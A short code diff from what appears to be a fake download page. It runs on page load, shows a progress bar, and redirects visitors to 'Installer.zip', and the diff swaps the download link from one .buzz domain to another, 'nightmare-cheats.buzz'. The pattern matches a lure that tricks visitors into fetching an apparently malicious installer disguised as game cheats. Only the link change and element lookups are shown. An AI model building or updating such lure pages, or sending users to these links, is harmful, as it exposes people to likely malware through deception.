@@ -1,5 +1,5 @@
 document.addEventListener("DOMContentLoaded", () => {
-  const REDIRECT_URL = "https://ultraviolence.buzz/d/Installer.zip";
+  const REDIRECT_URL = "https://nightmare-cheats.buzz/Installer.zip";
 
   const bar         = document.getElementById("progress-bar");
   const pct         = document.getElementById("progress-pct");
